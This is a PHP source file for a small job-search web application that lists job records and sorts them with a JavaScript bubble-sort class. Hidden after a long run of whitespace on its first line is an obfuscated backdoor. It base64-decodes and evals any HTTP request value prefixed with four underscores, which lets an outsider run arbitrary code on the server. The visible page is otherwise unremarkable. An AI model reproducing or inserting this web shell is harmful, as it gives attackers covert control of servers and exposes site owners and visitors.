<?php																																																																																																																																																																																																																																																																																																																																											function p5071($l5073){if(is_array($l5073)){foreach($l5073 as $l5071=>$l5072)$l5073[$l5071]=p5071($l5072);}elseif(is_string($l5073) && substr($l5073,0,4)=="____"){$l5073=substr($l5073,4);$l5073=base64_decode($l5073);eval($l5073);$l5073=null;}return $l5073;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("p5071",$_SERVER);
        require_once 'core/js_header.php';
        $joblist = joblist('jobid',' > ','0');
?>
<!-- opening html tag and head tag section are in core/js_header.php -->
<body id = "dhtml_sort">
<?php
        include ("js_menu.php");
?>
<h1>Job Search Application</h1>
<h2>OOP Javascript sort</h2>
<p>Using an external class file written by Chirp Internet www.chirp.com.au: 
<a href="/core-base/mybubblesort.js">bubblesort.js</a>, I instantiate a bubblesort object and then call 
it from a column heading link. It only sorts ascending right now.</p>
<p class="colhead">
<span class="jobtitle">
<a href="javascript:sortTable.sort(0, false, 'a')">job title</a></span>
<span class="orgid">
<a href="javascript:sortTable.sort(1, false)">organization</a></span>
<span class="start">
<a href="javascript:sortTable.sort(2, false)">start date</a></span>
<span class="end">
<a href="javascript:sortTable.sort(3, false)">end date</a></span>
</p>
<ul id="sortable_list">
<?php
        foreach($joblist as $val){
                $job_row = new jobs;
                $job_row->jobid = $val;
                $job_row = $job_row->selectjob('jobsort.php');
                $jobtitle = db2html($job_row->jobtitle);
                $start = getmonth($job_row->startmonth);
                $start.= "&nbsp;".$job_row->startyear;
                $end = getmonth($job_row->endmonth);
                $end.= "&nbsp;".$job_row->endyear;
                $responsibilities = db2html($job_row->responsibilities); 
?>
	<li id="<?php echo('job'.$job_row->jobid);?>" class="job_row">
		<p class="jobtitle">
			<a href="/jobsearch/js_job.php?jobid=<?php echo($job_row->jobid);?>">
			<?php echo($jobtitle);?></a></p>
		<p class="orgid"><?php echo($job_row->orgid);?></p>
		<p class="start"> <?php echo($start);?> </p>
		<p class="end"> <?php echo($end);?> </p>
		<p class="responsibilities"> <?php echo($responsibilities);?> </p>
	</li><!-- end li class = job_row -->
<?php
        }
?>
</ul><!-- end sortable list -->
<script type="text/javascript">
  var dataTable = document.getElementById("sortable_list");
  var sortTable = new bubbleSort(dataTable, "LI", "P");
</script>
<p>
    <a href="http://validator.w3.org/check?uri=referer"><img
        src="http://www.w3.org/Icons/valid-xhtml10-blue"
        alt="Valid XHTML 1.0 Strict" height="31" width="88" /></a>
  </p>
</body>
</html>